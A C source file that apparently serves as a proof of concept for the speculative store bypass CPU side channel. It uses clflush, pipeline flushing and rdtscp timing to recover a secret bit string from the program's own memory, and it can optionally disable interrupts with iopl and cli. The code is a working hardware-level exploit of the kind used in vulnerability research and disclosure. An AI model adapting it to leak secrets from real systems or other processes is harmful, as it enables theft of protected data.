#include <stdio.h>
#include <sys/io.h>
#include <err.h>
#include <sys/mman.h>

//#define pipeline_flush() asm volatile("mov $0, %%eax\n\tcpuid\n\tlfence" : /*out*/ : /*in*/ : "rax","rbx","rcx","rdx","memory")
//#define clflush(addr) asm volatile("clflush (%0)"::"r"(addr):"memory")

void pipeline_flush() {
  asm volatile("mov $0, %%eax\n\tcpuid\n\tlfence" : /*out*/ : /*in*/ : "rax","rbx","rcx","rdx","memory");
}

void clflush(addr) {
  asm volatile("clflush (%0)"::"r"(addr):"memory");
}
// source of high-latency pointer to the memory slot
unsigned char **flushy_area[1000];
#define flushy (flushy_area+500)

// memory slot on which we want bad memory disambiguation
unsigned char *memory_slot_area[1000];
#define memory_slot (memory_slot_area+500)

//                                  0123456789abcdef
unsigned char secret_read_area[] = "0000011011101011";
unsigned char public_read_area[] = "################";

unsigned char timey_line_area[0x200000];
// stored in the memory slot first
#define timey_lines (timey_line_area + 0x10000)

unsigned char dummy_char_sink;

int testfun(int idx) {
  pipeline_flush();
  *flushy = memory_slot;
  *memory_slot = secret_read_area;
  timey_lines['0' << 12] = 1;
  timey_lines['1' << 12] = 1;
  pipeline_flush();
  clflush(flushy);
  clflush(&timey_lines['0' << 12]);
  clflush(&timey_lines['1' << 12]);
  asm volatile("mfence");
  pipeline_flush();

  // START OF CRITICAL PATH
  unsigned char **memory_slot__slowptr = *flushy;
  //pipeline_flush();
  // the following store will be speculatively ignored since its address is unknown
  *memory_slot__slowptr = public_read_area;
  // uncomment the instructions in the next line to break the attack
  asm volatile("" /*"mov $0, %%eax\n\tcpuid\n\tlfence"*/ : /*out*/ : /*in*/ : "rax","rbx","rcx","rdx","memory");
  // architectual read from dummy_timey_line, possible microarchitectural read from timey_line
  dummy_char_sink = timey_lines[(*memory_slot)[idx] << 12];
  // END OF CRITICAL PATH

  unsigned int t1, t2;

  pipeline_flush();
  asm volatile(
    "lfence\n\t"
    "rdtscp\n\t"
    "mov %%eax, %%ebx\n\t"
    "mov (%%rdi), %%r11\n\t"
    "rdtscp\n\t"
    "lfence\n\t"
  ://out
    "=a"(t2),
    "=b"(t1)
  ://in
    "D"(timey_lines + 0x1000 * '0')
  ://clobber
    "r11",
    "rcx",
    "rdx",
    "memory"
  );
  pipeline_flush();
  unsigned int delay_0 = t2 - t1;

  pipeline_flush();
  asm volatile(
    "lfence\n\t"
    "rdtscp\n\t"
    "mov %%eax, %%ebx\n\t"
    "mov (%%rdi), %%r11\n\t"
    "rdtscp\n\t"
    "lfence\n\t"
  ://out
    "=a"(t2),
    "=b"(t1)
  ://in
    "D"(timey_lines + 0x1000 * '1')
  ://clobber
    "r11",
    "rcx",
    "rdx",
    "memory"
  );
  pipeline_flush();
  unsigned int delay_1 = t2 - t1;

  if (delay_0 < HIT_THRESHOLD && delay_1 > HIT_THRESHOLD) {
    pipeline_flush();
    return 0;
  }
  if (delay_0 > HIT_THRESHOLD && delay_1 < HIT_THRESHOLD) {
    pipeline_flush();
    return 1;
  }
  pipeline_flush();
  return -1;
}

int main(void) {
  //char out[100000];
  //char *out_ = out;
  int idx;

#ifdef NO_INTERRUPTS
  if (mlockall(MCL_CURRENT|MCL_FUTURE) || iopl(3))
    err(1, "iopl(3)");
#endif
while(1){
  for (idx = 0; idx < 16; idx++) {
#ifdef NO_INTERRUPTS
    asm volatile("cli");
#endif
    pipeline_flush();
    long cycles = 0;
    int hits = 0;
    char results[33] = {0};
    /* if we don't break the loop after some time when it doesn't work,
    in NO_INTERRUPTS mode with SMP disabled, the machine will lock up */
    while (hits < 32 && cycles < 1000000) {
      pipeline_flush();
      int res = testfun(idx);
      if (res != -1) {
        pipeline_flush();
        results[hits] = res + '0';
        hits++;
      }
      cycles++;
      pipeline_flush();
    }
    pipeline_flush();
    #ifdef NO_INTERRUPTS
        asm volatile("sti");
    #endif
    printf("%c: %s in %ld cycles (hitrate: %f%%)\n",
        secret_read_area[idx], results, cycles, 100*hits/(double)cycles);
    //    out_ += sprintf(out_,
    //        "%c: %s in %ld cycles (hitrate: %f%%)\n",
    //        secret_read_area[idx], results, cycles, 100*hits/(double)cycles);
  }
  printf("\n");
}
//  printf("%s", out);
  pipeline_flush();
  return 0;
}
